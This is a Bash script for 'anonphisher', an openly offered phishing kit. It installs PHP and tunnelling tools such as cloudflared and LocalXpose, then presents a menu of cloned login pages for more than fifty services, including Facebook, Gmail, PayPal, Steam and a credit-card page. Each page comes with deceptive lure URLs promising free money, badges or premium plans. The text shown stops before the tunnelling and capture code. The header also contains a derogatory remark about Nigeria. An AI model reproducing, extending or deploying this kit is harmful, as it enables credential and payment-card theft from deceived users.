#!/bin/bash
#Author: AnonyminHack5
#Credits to: Akshay  &  TAHMID RAYAT 
#Version: 3.3.2 updated
#Do not copy script without authors' consent it is illegal and makes you as stupid as Nigeria or as stupid as the p in psychology
#Facebook: https://facebook.com/AnonyminHack5
clear='\033[0m'       # Text Reset
# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White
Orange='\033[33m'         # Orange
LGREY='\033[0;30m'		  # LightGrey
# Bold
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White
BLGREY='\033[1;30m'		  # Grey
# Underline
UBlack='\033[4;30m'       # Black
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UCyan='\033[4;36m'        # Cyan
UWhite='\033[4;37m'       # White
__version__="3.3.2"
## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='5555'
## ANSI colors (FG & BG)
RED="$(printf '\033[31m')" GREEN="$(printf '\033[32m')" ORANGE="$(printf '\033[33m')" BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')" WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')" GREENBG="$(printf '\033[42m')" ORANGEBG="$(printf '\033[43m')" BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')" CYANBG="$(printf '\033[46m')" WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
##Script Termination
exit_on_signal_SIGINT() {
    { echo -ne "\n\n""${RED}[${White}!${RED}]${Red} Program Interrupted. " 2>&1; reset_color; }
    exit 0
}
exit_on_signal_SIGTERM() {
    { echo -ne "\n\n""${RED}[${White}!${RED}]${Red} Program Interrupted. " 2>&1; reset_color; }
    exit 0
}
trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM
reset_color() {
    tput sgr0 
    tput op
    return
}
check_update() {
    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
	latest_version=$(curl -s "https://api.github.com/repos/TermuxHackz/anonphisher/releases/latest" | grep -Po '"tag_name": "\K.*?(?=")')
	if [[ $latest_version != "" ]]; then
		if [[ $latest_version != $__version__ ]]; then
			echo -e "${GREEN}New version available : ${ORANGE}$latest_version${WHITE}"
			echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Updating to latest version..."
			git pull
			echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Update successful."
			echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Restarting tool..."
			bash setup
			exit 0
		else
			echo -e "${GREEN}No update available."
			sleep 1
		fi
	else
		echo -e "${RED}Failed to check for update."
	fi

}
check_internet() {
    echo -ne "\n${Green}[${White}+${Green}]${Cyan} Internet Status: "
    timeout 3s curl -fIs "https://github.com/TermuxHackz" > /dev/null
    [ $? -eq 0 ] && echo -e "${Green}Online${White}" && check_update || echo -e "${Red}Offline${White}"
}
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}
## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi
if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi
if [[ -d .termuxhackz ]]; then
printf ""
else
mkdir .termuxhackz
fi
if [[ -d logs ]]; then
printf ""
else
mkdir logs
mkdir .cld.log
mv .cld.log .server
fi
if [[ -e sites.zip ]]; then
unzip -qq sites.zip
rm sites.zip
fi
if [[ -d ~/.ssh ]]; then
printf ""
else
mkdir ~/.ssh
fi
## Remove logfile
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi
if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi
## Kill already running process
kill_pid() {
	pkill -f "php|cloudflared|loclx|localtunnel"
}
## Download binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}
##Setup Custom port
cusport() {
	echo
	read -n1 -p "${RED}[${WHITE}!${RED}]${ORANGE} Do you want a Custom port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo -e "\n"
		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
		if [[ ! -z ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo
		else
			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port number: $CU_P, Try Again...${WHITE}"
			{ sleep 2; clear; smallbanner; cusport; }
		fi
	else
		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT....${WHITE}\n"
	fi

}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
		fi
	fi

}
## INstall LocalXpose
install_localxpose() {
	if [[ -e ".server/loclx" ]]; then #Change to .server/loclx
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

menu() {
printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m9\e[0m\e[1;92m]\e[0m\e[1;93m  Origin\e[0m         \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Gitlab\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m Custom\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;94m Update\e[0m\n" 
printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m Github\e[0m         \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;94m Author\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m         \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;93m vk\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m7\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;93m adobe\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m InstaFollowers\e[0m \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;93m badoo\e[0m\n"
printf "\e[1;34m==================================================\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;93m cryptocoin\e[0m \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;93m deviantart\e[0m \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;93m dropbox\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;93m ebay\e[0m       \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;93m paypal\e[0m     \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;93m pinterest\e[0m\n"  
printf "\e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;93m playstation\e[0m\e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;93m reddit\e[0m     \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;93m xbox\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;93m yandex\e[0m     \e[1;92m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;93m twitch\e[0m     \e[1;92m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;93m stackoverflow\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;93m messenger\e[0m  \e[1;92m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;93m shopify\e[0m    \e[1;92m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;93m shopping\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m40\e[0m\e[1;92m]\e[0m\e[1;93m verizon\e[0m    \e[1;92m[\e[0m\e[1;77m41\e[0m\e[1;92m]\e[0m\e[1;93m quora\e[0m      \e[1;92m[\e[0m\e[1;77m42\e[0m\e[1;92m]\e[0m\e[1;93m bet9ja\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m43\e[0m\e[1;92m]\e[0m\e[1;93m Wi-Fi\e[0m      \e[1;92m[\e[0m\e[1;77m44\e[0m\e[1;92m]\e[0m\e[1;93m Bitcoin\e[0m    \e[1;92m[\e[0m\e[1;77m45\e[0m\e[1;92m]\e[0m\e[1;93m free fire\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m46\e[0m\e[1;92m]\e[0m\e[1;93m Pubg\e[0m       \e[1;92m[\e[0m\e[1;77m47\e[0m\e[1;92m]\e[0m\e[1;93m Fortnite\e[0m   \e[1;92m[\e[0m\e[1;77m48\e[0m\e[1;92m]\e[0m\e[1;93m cc-phishing\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m49\e[0m\e[1;92m]\e[0m\e[1;93m C.O.D\e[0m      \e[1;92m[\e[0m\e[1;77m50\e[0m\e[1;92m]\e[0m\e[1;93m Mediafire\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m51\e[0m\e[1;92m]\e[0m\e[1;93m Airbnb\e[0m     \e[1;92m[\e[0m\e[1;77m52\e[0m\e[1;92m]\e[0m\e[1;93m Discord\e[0m    \e[1;92m[\e[0m\e[1;77m53\e[0m\e[1;92m]\e[0m\e[1;93m Roblox\e[0m\n"
read -p $'\n\e[1;92manonphisher>> \e[0m\en' option


if [[ $option == 1 ]]; then
instagram
elif [[ $option == 2 ]]; then
facebook
elif [[ $option == 3 ]]; then
website="snapchat"
mask='https://view-locked-snapchat-accounts-secretly'
tunnel_menu
elif [[ $option == 4 ]]; then
website="twitter"
mask='https://get-blue-badge-on-twitter-free'
tunnel_menu
elif [[ $option == 5 ]]; then
website="github"
tunnel_menu
elif [[ $option == 6 ]]; then
gmail
elif [[ $option == 7 ]]; then
website="spotify"
mask='https://convert-your-account-to-spotify-premium'
tunnel_menu

elif [[ $option == 8 ]]; then
website="netflix"
mask='https://upgrade-your-netflix-plan-free'
tunnel_menu

elif [[ $option == 9 ]]; then
website="origin"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu

elif [[ $option == 10 ]]; then
website="steam"
mask='https://steam-free-gift-card'
tunnel_menu

elif [[ $option == 11 ]]; then
website="yahoo"
mask='https://grab-mail-from-anyother-yahoo-account-free'
tunnel_menu

elif [[ $option == 12 ]]; then
website="linkedin"
mask='https://get-a-premium-plan-for-linkedin-free'
tunnel_menu

elif [[ $option == 13 ]]; then
website="protonmail"
mask='https://protonmail-pro-basics-for-free'
tunnel_menu

elif [[ $option == 14 ]]; then
website="wordpress"
mask='https://wordpress-traffic-free'
tunnel_menu

elif [[ $option == 15 ]]; then
website="microsoft"
mask='https://unlimited-onedrive-space-for-free'
tunnel_menu

elif [[ $option == 16 ]]; then
website="instafollowers"
tunnel_menu

elif [[ $option == 17 ]]; then
website="gitlab"
mask='https://get-1k-followers-on-gitlab-free'
tunnel_menu

elif [[ $option == 18 ]]; then
website="create"
createpage
tunnel_menu

elif [[ $option == 19 ]]; then
echo -e "\e[101m Bye!!.. and have a good day 👋 \e[0m"
sleep 0.5
exit 1 

elif [[ $option == 20 ]]; then
sleep 1
echo "Updating Anonphisher... " | lolcat
sleep 0.5
clear
echo -e "\e[1;92m...//..\e[0m\e[1;93m~Searching for updates ~...\e[0m..//..\e[0m"
sleep 2
clear
echo -e "\e[1;94m [+] Updates Found [+] \e[0m"
sleep 2
clear
smallmenu() {
sleep 0.5
printf "\e[1;97mProceed to update?\e[0m"
sleep 0.5
printf "\n"
sleep 0.5
printf "\e[1;97m[01]\e[0m\e[1;92m Yes\e[0m\n"
sleep 0.5
printf "\e[1;97m[02]\e[0m\e[1;92m No\e[0m\n"
sleep 0.5
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose: \e[0m\en' choice

if [[ $choice == 1 || $choice == 01 ]]; then
echo -e "\e[1;93m Nice choice... Haha😋\e[0m"
sleep 0.5
echo -e "\e[1;92m Press enter to update or \e[0m\e[1;37mCTRL C\e[0m\e[1;92m to exit.. \e[0m"
read a1
echo "Updating now..!!" | lolcat
sleep 1
cd $HOME || cd /data/data/com.termux/files/home
rm -rf anonphisher
git clone https://github.com/TermuxHackz/anonphisher
cd anonphisher
chmod 777 *
printf "\e[1;92m[\e[0m\e[1;77m✔\e[0m\e[1;92m]\e[0m\e[1;93m Update Completed!!\e[0m\n" 
echo ""
printf "\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m]\e[0m\e[1;93m RUN bash anonphisher.sh\e[0m\n" 


elif [[ $choice == 2 || $choice == 02 ]]; then
echo -e "\e[1;94m As you wish...lol\e[0m"
sleep 0.5
echo -e "\e[1;93m Leave!!🙄\e[0m"
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m]\e[0m\e[1;93m ANONPHISHER NOT UPDATED.!!!!!!..UPDATE!!\e[0m\n" 
exit 1

else
printf "\e[1;93m [!] Wrong option [!]\e[0m\n"
clear
menu
fi
}
smallmenu

elif [[ $option == 21 ]]; then
clear
printf "\n"
sleep 0.5
printf "\e[1;92m============\e[0m\e[1;91m[\e[0m\e[1;93mAuthor\e[0m\e[1;91m]\e[0m\e[1;92m============\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Version: \e[0m\e[1;37m3.3.2		  \e[0m\e[1;97m  [•]\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Twitter: \e[0m\e[1;34mAnonyminHack5 \e[0m\e[1;97m   [•]\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Facebook: \e[0m\e[1;36mAnonyminHack5 \e[0m\e[1;97m  [•]\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Created by \e[0m\e[1;37mAnonyminHack5 \e[0m\e[1;97m [•]\e[0m\n"
sleep 0.5
printf "\e[1;94m[•]\e[0m\e[1;91m Team: \e[0m\e[1;34mTermuxHackz Society \e[0m\e[1;97m[•]\e[0m\n"
sleep 0.5
printf "\e[1;94m[•]\e[0m\e[1;91m Credits: \e[0m\e[1;34mAkshay,TAHMID RAYAT &John Smith \e[0m\e[1;97m[•]\e[0m\n"
sleep 0.5
printf "\e[1;94m[•]\e[0m\e[1;91m Github: \e[0m\e[1;36mTermuxHackz \e[0m\e[1;97m      [•] \e[0m\n"
sleep 0.5
printf "\e[1;92m==========\e[0m\e[1;91m[\e[0m\e[1;93mAnonphisher\e[0m\e[1;91m]\e[0m\e[1;92m==========\e[0m\n"
sleep 0.5
printf "\n"
sleep 0.5
echo -e "\e[1;98m Press enter to go back \e[0m\e[1;37m or CTRL + C \e[0m\e[1;92mto exit\e[0m"
read a1
clear
banner
menu

elif [[ $option == 22 ]]; then
vk

elif [[ $option == 23 ]]; then
website="adobe"
mask='https://get-adobe-lifetime-pro-membership-free'
tunnel_menu

elif [[ $option == 24 ]]; then
website="badoo"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu

elif [[ $option == 25 ]]; then
website="cryptocoinsniper"
tunnel_menu 

elif [[ $option == 26 ]]; then
website="deviantart"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu 

elif [[ $option == 27 ]]; then
website="dropbox"
mask='https://get-1TB-cloud-storage-free'
tunnel_menu

elif [[ $option == 28 ]]; then
website="ebay"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu

elif [[ $option == 29 ]]; then
website="paypal"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu

elif [[ $option == 30 ]]; then
website="pinterest"
mask='https://get-a-premium-plan-for-pinterest-free'
tunnel_menu

elif [[ $option == 31 ]]; then
website="playstation"
mask='https://playstation-free-gift-card'
tunnel_menu

elif [[ $option == 32 ]]; then
website="reddit"
mask='https://reddit-official-verified-member-badge'
tunnel_menu

elif [[ $option == 33 ]]; then
website="xbox"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu

elif [[ $option == 34 ]]; then
website="yandex"
mask='https://grab-mail-from-anyother-yandex-account-free'
tunnel_menu

elif [[ $option == 35 ]]; then
website="twitch"
mask='https://unlimited-twitch-tv-user-for-free'
tunnel_menu

elif [[ $option == 36 ]]; then
website="stackoverflow"
mask='https://get-stackoverflow-lifetime-pro-membership-free'
tunnel_menu

elif [[ $option == 37 ]]; then
website="messenger"
tunnel_menu

elif [[ $option == 38 ]]; then
website="shopify"
tunnel_menu

elif [[ $option == 39 ]]; then
website="shopping"
tunnel_menu

elif [[ $option == 40 ]]; then
website="verizon"
tunnel_menu

elif [[ $option == 41 ]]; then
website="quora"
mask='https://quora-premium-for-free'
tunnel_menu

elif [[ $option == 42 ]]; then
website="bet9ja"
tunnel_menu

elif [[ $option == 43 ]]; then
website="Wi-Fi"
tunnel_menu

elif [[ $option == 44 ]]; then
website="Bitcoin"
tunnel_menu

elif [[ $option == 45 ]]; then
website="free_fire"
tunnel_menu

elif [[ $option == 46 ]]; then
website="pugb"
tunnel_menu

elif [[ $option == 47 ]]; then
website="fortnite"
tunnel_menu

elif [[ $option == 48 ]]; then
website="cc-phishing"
tunnel_menu

elif [[ $option == 49 ]]; then
website="cod"
tunnel_menu

elif [[ $option == 50 ]]; then
website="mediafire"
mask='https://get-1TB-on-mediafire-free'
tunnel_menu

elif [[ $option == 51 ]]; then
website="airbnb"
mask='https://airbnb-com'
tunnel_menu

elif [[ $option == 52 ]]; then
website="discord"
tunnel_menu

elif [[ $option == 53 ]]; then
website="roblox"
tunnel_menu

else
printf "\e[1;93m[\e[0m\e[1;31m!\e[0m\e[1;93m]\e[0m\e[1;37m Invalid option\e[0m\e[1;93m [\e[0m\e[1;31m!\e[0m\e[1;93m]\e[0m\n"
sleep 0.95
clear || cls
banner
menu
fi
}

facebook(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page?\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page?\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security Login Page?\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Messenger Login Page?\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Free Likes Login Page?\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option


if [[ $fb_option == 1 || $fb_option == 01 ]]; then
website="facebook"
mask='https://blue-badge-verified-badge-for-facebook'
tunnel_menu
elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
website="fb_advanced"
mask='https://vote-for-the-best-social-media'
tunnel_menu
elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
website="fb_security"
mask='https://make-your-facebook-secured-and-free-from-hackers'
tunnel_menu
elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
website="fb_messenger"
mask='https://get-messenger-premium-features-free'
tunnel_menu
elif [[ $fb_option == 5 || $fb_option == 05 ]]; then
website="fb_freelikes"
tunnel_menu

else
printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

instagram(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page? \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Auto Followers Login Page? \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Blue Badge Verify Login Page? \e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' ig_option


if [[ $ig_option == 1 || $ig_option == 01 ]]; then
website="instagram"
mask='https://instagram-com'
tunnel_menu
elif [[ $ig_option == 2 || $ig_option == 02 ]]; then
website="ig_followers"
mask='https://get-unlimited-followers-for-instagram'
tunnel_menu
elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
website="ig_verify"
mask='https://blue-badge-verify-for-instagram'
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}
gmail(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Gmail Old Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Gmail New Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' gmail_option


if [[ $gmail_option == 1 || $gmail_option == 01 ]]; then
website="google"
mask='https://get-unlimited-google-photos-free'
tunnel_menu
elif [[ $gmail_option == 2 || $gmail_option == 02 ]]; then
website="google_new"
mask='https://get-unlimited-google-photos-free'
tunnel_menu
elif [[ $gmail_option == 3 || $gmail_option == 03 ]]; then
website="google_poll"
mask='https://vote-for-the-best-social-media'
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}
stop() {

checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi

}

vk(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' vk_option


if [[ $vk_option == 1 || $vk_option == 01 ]]; then
website="vk"
mask='https://vk-premium-real-method-2020'
tunnel_menu
elif [[ $vk_option == 2 || $vk_option == 02 ]]; then
website="vk_poll"
mask='https://vote-for-the-best-social-media'
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

banner() {
printf "\e[1;78m                          \e[0m\n"
